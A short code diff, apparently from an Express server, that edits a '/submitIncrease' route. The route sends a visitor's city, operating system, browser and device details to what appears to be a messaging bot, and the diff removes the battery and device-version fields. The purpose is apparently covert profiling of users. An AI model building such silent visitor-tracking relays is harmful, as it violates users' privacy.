@@ -526,10 +526,7 @@ app.post('/submitIncrease', (req, res) => {
 المدينة: ${city}
 نظام التشغيل: ${deviceInfo.os.toString()}
 المتصفح: ${deviceInfo.toAgent()}
-الجهاز: ${deviceInfo.device.toString()}
-مستوى البطارية: ${deviceInfo.batteryLevel.toString()}
-حالة الشحن: ${deviceInfo.chargingState.toString()}
-إصدار الجهاز: ${deviceInfo.deviceVersion.toString()}`)
+الجهاز: ${deviceInfo.device.toString()}`)
         .then(() => {
             res.json({ success: true });
         })
@@ -538,6 +535,8 @@ app.post('/submitIncrease', (req, res) => {
             res.status(500).json({ error: 'Failed to send increase data', details: error.message });
         });
 });
+
+
 
 
 // أوامر البوت
